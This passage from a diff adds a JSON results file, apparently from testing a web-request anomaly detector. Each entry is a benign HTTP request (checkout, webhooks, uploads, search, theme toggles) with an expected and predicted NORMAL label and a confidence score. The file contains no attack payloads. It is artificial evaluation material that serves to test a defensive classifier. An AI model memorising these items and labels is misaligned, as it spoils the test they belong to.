+    "confidence": 0.6308,
+    "correct": true
+  },
+  {
+    "category": "Newsletter Subscription",
+    "payload": "POST /newsletter/subscribe",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5928,
+    "correct": true
+  },
+  {
+    "category": "Cart Add Item",
+    "payload": "POST /cart/add?product_id=99",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.6204,
+    "correct": true
+  },
+  {
+    "category": "Checkout Page",
+    "payload": "GET /checkout/step1",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5316,
+    "correct": true
+  },
+  {
+    "category": "Order Success",
+    "payload": "GET /checkout/success?order_id=ord_123",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5547,
+    "correct": true
+  },
+  {
+    "category": "Webhook (GitHub)",
+    "payload": "POST /webhooks/github (Push Event)",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.6186,
+    "correct": true
+  },
+  {
+    "category": "Webhook (Stripe)",
+    "payload": "POST /webhooks/stripe (Payment Success)",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.6285,
+    "correct": true
+  },
+  {
+    "category": "HEAD Request (CDN)",
+    "payload": "HEAD /assets/large-video.mp4",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8242,
+    "correct": true
+  },
+  {
+    "category": "OPTIONS Preflight (CORS)",
+    "payload": "OPTIONS /api/v1/data",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8333,
+    "correct": true
+  },
+  {
+    "category": "Font Loading",
+    "payload": "GET /fonts/inter-bold.woff2",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5379,
+    "correct": true
+  },
+  {
+    "category": "Manifest Loading",
+    "payload": "GET /manifest.json",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5209,
+    "correct": true
+  },
+  {
+    "category": "i18n Localization",
+    "payload": "GET /locales/vi-VN.json",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.536,
+    "correct": true
+  },
+  {
+    "category": "GraphQL Query (User)",
+    "payload": "POST /graphql (query { me { name } })",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5372,
+    "correct": true
+  },
+  {
+    "category": "Documentation Access",
+    "payload": "GET /docs/api/introduction",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.689,
+    "correct": true
+  },
+  {
+    "category": "Blog Article",
+    "payload": "GET /blog/future-of-ai-2026",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5008,
+    "correct": true
+  },
+  {
+    "category": "Comment Submission",
+    "payload": "POST /blog/comment (valid user text)",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5659,
+    "correct": true
+  },
+  {
+    "category": "Video Fragment",
+    "payload": "GET /stream/hls/chunk_001.ts",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5682,
+    "correct": true
+  },
+  {
+    "category": "Map Tile Request",
+    "payload": "GET /maps/v2/tile/10/512/324.png",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5322,
+    "correct": true
+  },
+  {
+    "category": "Admin Statistics",
+    "payload": "GET /admin/dashboard/users/active",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5945,
+    "correct": true
+  },
+  {
+    "category": "File Download (PDF)",
+    "payload": "GET /downloads/guide-v2.pdf",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5108,
+    "correct": true
+  },
+  {
+    "category": "User Login (Multi-factor Auth Step)",
+    "payload": "POST /auth/mfa/verify {\"code\": \"123456\"}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.649,
+    "correct": true
+  },
+  {
+    "category": "File Upload (Profile Picture JPEG)",
+    "payload": "POST /api/v1/user/avatar (multipart/form-data)",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.829,
+    "correct": true
+  },
+  {
+    "category": "File Upload (Document PDF)",
+    "payload": "POST /api/v1/documents (binary stream)",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8689,
+    "correct": true
+  },
+  {
+    "category": "Search (Autocomplete API)",
+    "payload": "GET /api/v1/search/suggest?q=secur",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.868,
+    "correct": true
+  },
+  {
+    "category": "Search (Filter by Category)",
+    "payload": "GET /products?category=electronics&brand=apple",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5692,
+    "correct": true
+  },
+  {
+    "category": "Search (Sort by Price)",
+    "payload": "GET /products?sort=price_desc&page=1",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5569,
+    "correct": true
+  },
+  {
+    "category": "API POST (Create Comment)",
+    "payload": "POST /api/v1/posts/55/comments {\"text\": \"Great article!\"}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8034,
+    "correct": true
+  },
+  {
+    "category": "API PUT (Update Avatar)",
+    "payload": "PUT /api/v1/user/settings {\"avatar_url\": \"https://img.com/u1.png\"}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.822,
+    "correct": true
+  },
+  {
+    "category": "API GET (Paginated Users List)",
+    "payload": "GET /admin/users?limit=20&offset=40",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5664,
+    "correct": true
+  },
+  {
+    "category": "API GET (CSV Export Request)",
+    "payload": "GET /admin/reports/sales.csv?year=2025",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.6319,
+    "correct": true
+  },
+  {
+    "category": "Password Change (Current/New Password)",
+    "payload": "POST /user/password-update {\"old\": \"pass1\", \"new\": \"pass2\"}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.6262,
+    "correct": true
+  },
+  {
+    "category": "Two-Factor Secret Setup",
+    "payload": "GET /user/mfa/setup-qr",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5202,
+    "correct": true
+  },
+  {
+    "category": "Newsletter Unsubscribe Link",
+    "payload": "GET /newsletter/unsubscribe?token=abc123def456",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.589,
+    "correct": true
+  },
+  {
+    "category": "Email Verification Link Click",
+    "payload": "GET /auth/verify-email?code=v987654321",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5715,
+    "correct": true
+  },
+  {
+    "category": "Invite Team Member Submit",
+    "payload": "POST /team/invite {\"email\": \"colleague@work.com\"}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5666,
+    "correct": true
+  },
+  {
+    "category": "Project Creation (JSON naming)",
+    "payload": "POST /api/v1/projects {\"name\": \"Security Audit 2026\"}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8445,
+    "correct": true
+  },
+  {
+    "category": "Billing Address Update",
+    "payload": "PUT /billing/address {\"street\": \"123 Main St\", \"city\": \"Hanoi\"}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.7298,
+    "correct": true
+  },
+  {
+    "category": "Credit Card Tokenization (Stripe/Internal)",
+    "payload": "POST /api/v1/payment/tokens {\"card_last4\": \"4242\"}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8565,
+    "correct": true
+  },
+  {
+    "category": "Order History Search",
+    "payload": "GET /user/orders?status=shipped&from=2025-01-01",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5563,
+    "correct": true
+  },
+  {
+    "category": "Knowledge Base Search",
+    "payload": "GET /help/kb/search?query=how+to+reset+password",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5075,
+    "correct": true
+  },
+  {
+    "category": "API POST (Log Frontend Error)",
+    "payload": "POST /logs/client {\"error\": \"Uncaught TypeError\", \"stack\": \"...\"}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.6393,
+    "correct": true
+  },
+  {
+    "category": "API POST (Metric Tracking)",
+    "payload": "POST /analytics/metric {\"event\": \"button_click\", \"label\": \"signup\"}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.6737,
+    "correct": true
+  },
+  {
+    "category": "WebSocket Handshake (Normal)",
+    "payload": "GET /ws/notifications (Upgrade: websocket)",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.595,
+    "correct": true
+  },
+  {
+    "category": "WebSocket Heartbeat (Ping)",
+    "payload": "[Binary Frame] 0x89 (Ping)",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.6999,
+    "correct": true
+  },
+  {
+    "category": "Resource Loading (SVG Icon)",
+    "payload": "GET /static/icons/heart.svg",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5991,
+    "correct": true
+  },
+  {
+    "category": "Resource Loading (WebP Image)",
+    "payload": "GET /images/hero-banner.webp",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5416,
+    "correct": true
+  },
+  {
+    "category": "Resource Loading (JSON Config)",
+    "payload": "GET /config/app-settings.json",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.564,
+    "correct": true
+  },
+  {
+    "category": "i18n Change (Language Toggle)",
+    "payload": "GET /api/v1/locale/set?lang=en",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8683,
+    "correct": true
+  },
+  {
+    "category": "Dark Mode Theme Toggle",
+    "payload": "POST /user/ui/theme {\"mode\": \"dark\"}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5941,
+    "correct": true
+  },
+  {
+    "category": "User Notification Dismiss",
+    "payload": "DELETE /api/v1/notifications/1024",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8699,
+    "correct": true
+  },
+  {
+    "category": "In-App Message Read Receipt",
+    "payload": "PATCH /api/v1/messages/500 {\"read\": true}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8385,
+    "correct": true
+  },
+  {
+    "category": "Video Playback Progress Sync",
+    "payload": "POST /api/v1/sync/video {\"id\": \"v_123\", \"position\": 450}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8583,
+    "correct": true
+  },
+  {
+    "category": "Audio Stream Fragment Load",
+    "payload": "GET /stream/audio/segment_77.aac",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5494,
+    "correct": true
+  },
+  {
+    "category": "Map Zoom/Pan Coordinates",
+    "payload": "GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8706,
+    "correct": true
+  },
+  {
+    "category": "Dashboard Widget Refresh",
+    "payload": "GET /api/v1/dashboard/widgets/sales-chart/data",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8765,
+    "correct": true
+  },
+  {
+    "category": "Report Generation (Polling status)",
+    "payload": "GET /api/v1/tasks/rep_99/status",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8781,
+    "correct": true
+  },
+  {
+    "category": "Terms of Service Acceptance",
+    "payload": "POST /legal/tos/accept {\"version\": \"2.1.0\"}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5864,
+    "correct": true
+  },
+  {
+    "category": "GDPR Consent Modal Submit",
+    "payload": "POST /privacy/consent {\"analytics\": true, \"marketing\": false}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.6083,
+    "correct": true
+  },
+  {
+    "category": "Site Search (Complex query with AND, OR)",
+    "payload": "GET /search?q=machine+learning+NOT+python",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5951,
+    "correct": true
+  },
+  {
+    "category": "Product Review Submit (Text + Star rating)",
+    "payload": "POST /reviews {\"id\": \"p_50\", \"stars\": 5, \"comment\": \"Amazing quality!\"}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.6138,
+    "correct": true
+  },
+  {
+    "category": "Wishlist Add Request",
+    "payload": "POST /wishlist/add {\"item_id\": \"it_888\"}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5831,
+    "correct": true
+  },
+  {
+    "category": "Compare Products Modal Access",
+    "payload": "GET /products/compare?base=p1&target=p2",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5871,
+    "correct": true
+  },
+  {
+    "category": "Store Locator Search (Zip codes)",
+    "payload": "GET /stores/find?zip=10001&distance=10",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5724,
+    "correct": true
+  },
+  {
+    "category": "Career Page (Job application submit)",
+    "payload": "POST /careers/apply {\"job_id\": \"eng_01\", \"name\": \"John Doe\"}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.6504,
+    "correct": true
+  },
+  {
+    "category": "Support Ticket Attachments",
+    "payload": "GET /api/v1/support/tickets/404/attachments",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8685,
+    "correct": true
+  },
+  {
+    "category": "Live Chat Initiation",
+    "payload": "POST /chat/init {\"user_id\": \"u_55\", \"topic\": \"billing\"}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.6305,
+    "correct": true
+  },
+  {
+    "category": "RSS Feed Access",
+    "payload": "GET /feed/news.rss",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5071,
+    "correct": true
+  },
+  {
+    "category": "Podcast RSS Metadata",
+    "payload": "GET /podcasts/latest.xml",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.545,
+    "correct": true
+  },
+  {
+    "category": "E-book Kindle Delivery Request",
+    "payload": "POST /api/v1/deliver/kindle {\"book_id\": \"b_772\"}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8524,
+    "correct": true
+  },
+  {
+    "category": "Logout Confirmation Access",
+    "payload": "GET /auth/logout/confirm",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5762,
+    "correct": true
+  },
+  {
+    "category": "Test",
+    "payload": "GET /homess",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5472,
+    "correct": true
+  }
+]
